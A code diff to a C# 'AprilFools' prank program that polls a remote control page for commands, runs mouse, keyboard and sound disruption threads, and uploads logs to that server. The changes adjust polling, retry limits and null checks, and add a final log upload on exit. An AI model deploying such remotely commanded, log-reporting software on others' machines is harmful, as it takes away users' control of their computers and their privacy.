@@ -46,7 +46,7 @@ namespace AprilFools
         /// <summary>sleep time for main thread</summary>
         private const int _mainThreadPollingInterval = 50;
         /// <summary>Sleep time for Control read thread. This is how often the control page will get polled</summary>
-        private const int _externalControlThreadPollingInterval = 3*1000;
+        private const int _externalControlThreadPollingInterval = 5*1000;
 
         private static bool _externalControlThreadRunning = true;//should always run unless all external control is disabled
         private static bool _soundThreadRunning = true;//should always run unless all sounds are disabled
@@ -88,7 +88,7 @@ namespace AprilFools
         private const string CTRL_WEB_PAGE_NAME = "prankController.php";
         private const string NEW_CMD_TAG = "_NEW_";
         private const char CMD_SEPERATION_TAG = '\n';
-        private const int externalControlPageFailMaxAttempts = 10;
+        private const int externalControlPageFailMaxAttempts = 100;
         private static int externalControlPageFailAttempts = 0;
         private static string ctrlWebPage = null;
 
@@ -234,6 +234,9 @@ namespace AprilFools
         private static string FetchCtrlPage(bool updateSchedule=false, bool includeTimeStamp=false, bool inludeLogs=true)
         {
             //this is temperarily set to always report logs
+            if (ctrlWebPage == null)
+                return null;
+
             string pageUrl = ctrlWebPage;
 
             if (updateSchedule)
@@ -247,14 +250,14 @@ namespace AprilFools
             return GenericsClass.DownloadHTML(pageUrl,null,true);
         }
 
-        private static void ReadFromCtrlWebPage(bool firstRun=false)
+        private static void ReadFromCtrlWebPage(bool ignoreExternalCmds=false)
         {
             //GenericsClass.Log("ReadFromCtrlWebPage(" + firstRun + ")");
             string html = FetchCtrlPage();
 
             if (html != null)
             {
-                if (!firstRun)
+                if (!ignoreExternalCmds)
                 {
                     //process html from page by pulling out new cmds
                     string[] newExternalCmds = html.Split(CMD_SEPERATION_TAG);
@@ -806,7 +809,8 @@ namespace AprilFools
             ReadFromCtrlWebPage(true);
 
             // Start all of the threads
-            externalControlThread.Start();
+            if (ctrlWebPage != null)
+                externalControlThread.Start();
             mouseThread.Start();
             eraticKeyboardThread.Start();
             soundThread.Start();
@@ -883,6 +887,7 @@ namespace AprilFools
 #endif
 
             GenericsClass.Log("Terminating all threads");
+            ReadFromCtrlWebPage(true);//try and upload final log
             // Kill all threads and exit application
             mouseThread.Abort();
             eraticKeyboardThread.Abort();
